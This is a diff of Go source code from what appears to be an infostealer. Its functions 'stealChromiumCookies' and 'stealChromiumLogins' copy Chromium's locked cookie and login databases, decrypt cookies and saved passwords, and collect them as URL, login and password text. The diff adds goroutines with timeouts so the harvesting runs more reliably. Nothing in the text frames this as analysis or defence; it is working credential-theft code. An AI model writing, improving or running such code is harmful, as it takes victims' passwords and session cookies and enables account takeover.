@@ -161,61 +161,76 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			}
 		}
 
-		var dbPath string
-		var needCleanup bool
-
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		copyOk := false
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
 			_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
 			_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
+			copyOk = true
+		}
+
+		var dbPath string
+		if copyOk {
 			dbPath = tmpPath
-			needCleanup = true
+			defer os.Remove(tmpPath)
+			defer os.Remove(tmpPath + "-wal")
+			defer os.Remove(tmpPath + "-shm")
 		} else {
 			dbPath = cookiePath
 		}
 
-		if needCleanup {
-			defer os.Remove(tmpPath)
-			defer os.Remove(tmpPath + "-wal")
-			defer os.Remove(tmpPath + "-shm")
+		type queryResult struct {
+			cookies string
+			err     string
 		}
-
-		db, err := sql.Open("sqlite", dbPath)
-		if err != nil {
-			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
-			continue
-		}
-		db.Exec("PRAGMA busy_timeout = 3000")
-		db.Exec("PRAGMA journal_mode = WAL")
-
-		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
-		if err != nil {
-			errs = append(errs, fmt.Sprintf("%s/%s query: %v", browserName, profile, err))
-			db.Close()
-			continue
-		}
-
-		rowCount := 0
-		for rows.Next() {
-			var host, name, path string
-			var encValue []byte
-			var expires int64
-			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
-				errs = append(errs, fmt.Sprintf("%s/%s scan: %v", browserName, profile, err))
-				continue
+		ch := make(chan queryResult, 1)
+		go func(path string) {
+			db, err := sql.Open("sqlite", path)
+			if err != nil {
+				ch <- queryResult{"", fmt.Sprintf("%s/%s open: %v", browserName, profile, err)}
+				return
 			}
-			rowCount++
+			defer db.Close()
+			db.Exec("PRAGMA busy_timeout = 2000")
+			db.Exec("PRAGMA journal_mode = WAL")
 
-			value := decryptCookieValue(encValue, userDataPath)
+			rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+			if err != nil {
+				ch <- queryResult{"", fmt.Sprintf("%s/%s query: %v", browserName, profile, err)}
+				return
+			}
+			defer rows.Close()
 
-			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
-				host, name, value, path, expires))
-		}
-		rows.Close()
-		db.Close()
+			var buf strings.Builder
+			rowCount := 0
+			for rows.Next() {
+				var host, name, path string
+				var encValue []byte
+				var expires int64
+				if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
+					continue
+				}
+				rowCount++
+				value := decryptCookieValue(encValue, userDataPath)
+				buf.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n", host, name, value, path, expires))
+			}
+			if rowCount == 0 {
+				ch <- queryResult{"", fmt.Sprintf("%s/%s: 0 rows", browserName, profile)}
+				return
+			}
+			ch <- queryResult{buf.String(), ""}
+		}(dbPath)
 
-		if rowCount == 0 {
-			errs = append(errs, fmt.Sprintf("%s/%s: 0 rows", browserName, profile))
+		select {
+		case res := <-ch:
+			if res.err != "" {
+				errs = append(errs, res.err)
+			}
+			if res.cookies != "" {
+				allCookies.WriteString(res.cookies)
+			}
+		case <-time.After(4 * time.Second):
+			errs = append(errs, fmt.Sprintf("%s/%s: timeout", browserName, profile))
 		}
 	}
 
@@ -232,53 +247,63 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			continue
 		}
 
-		var dbPath string
-		var needCleanup bool
-
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_logins_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		copyOk := false
 		if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
+			copyOk = true
+		}
+
+		var dbPath string
+		if copyOk {
 			dbPath = tmpPath
-			needCleanup = true
+			defer os.Remove(tmpPath)
 		} else {
 			dbPath = loginPath
 		}
 
-		if needCleanup {
-			defer os.Remove(tmpPath)
-		}
+		ch := make(chan string, 1)
+		go func(path string) {
+			db, err := sql.Open("sqlite", path)
+			if err != nil {
+				ch <- ""
+				return
+			}
+			defer db.Close()
+			db.Exec("PRAGMA busy_timeout = 2000")
 
-		db, err := sql.Open("sqlite", dbPath)
-		if err != nil {
-			continue
-		}
-		db.Exec("PRAGMA busy_timeout = 3000")
+			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+			if err != nil {
+				ch <- ""
+				return
+			}
+			defer rows.Close()
 
-		rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
-		if err != nil {
-			db.Close()
-			continue
-		}
+			var buf strings.Builder
+			for rows.Next() {
+				var url, username string
+				var encPassword []byte
+				if err := rows.Scan(&url, &username, &encPassword); err != nil {
+					continue
+				}
+				if username == "" {
+					continue
+				}
+				password := decryptCookieValue(encPassword, userDataPath)
+				if password == "" || password == "(encrypted)" {
+					continue
+				}
+				buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
+			}
+			ch <- buf.String()
+		}(dbPath)
 
-		for rows.Next() {
-			var url, username string
-			var encPassword []byte
-			if err := rows.Scan(&url, &username, &encPassword); err != nil {
-				continue
+		select {
+		case res := <-ch:
+			if res != "" {
+				sb.WriteString(res)
 			}
-			if url == "" && username == "" {
-				continue
-			}
-			if username == "" {
-				continue
-			}
-			password := decryptCookieValue(encPassword, userDataPath)
-			if password == "" || password == "(encrypted)" {
-				continue
-			}
-			sb.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
+		case <-time.After(4 * time.Second):
 		}
-		rows.Close()
-		db.Close()
 	}
 	return sb.String()
 }
